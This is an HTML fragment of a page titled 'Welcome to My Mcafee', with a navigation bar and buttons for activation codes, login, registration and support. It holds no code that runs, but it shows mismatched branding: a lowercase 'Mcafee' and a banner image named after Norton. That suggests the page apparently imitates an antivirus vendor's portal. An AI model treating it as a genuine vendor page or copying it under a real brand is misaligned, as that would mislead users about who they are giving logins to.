...
<nav class="navbar navbar-color" style="min-height:57px; z-index:10;">
  <div class="container">
	...
	<li class="btn btn-lg nav-btn"><a href="../act-mca.php">Activate Activation Code</a></li>
	<li class="btn btn-lg nav-btn"><a href="../mcalog/mca-log.php">Login</a></li>
	<li class="btn btn-lg nav-btn"><a href="mca-reg.php">Register</a></li>
	<li class="btn btn-lg nav-btn"><a href="../mca-support.php">Contact Support</a></li>
	</ul>
  </div>
</nav>
<div class="home-slider">
	<img src="../img/mynorton-hero.jpg" class="slider-home">
	<h1 class="slider-cnt-position">Welcome to My Mcafee</h1>
	<h4 class="slider-cnt-position1">Register and activate your protection</h4>
</div>
<a href="../mcalog/mca-log.php" class="slider-cnt-position2" value="snjdf">Login</a>
<a href="mca-reg.php" class="register-btn slider-cnt-position2" value="snjdf">Register</a>
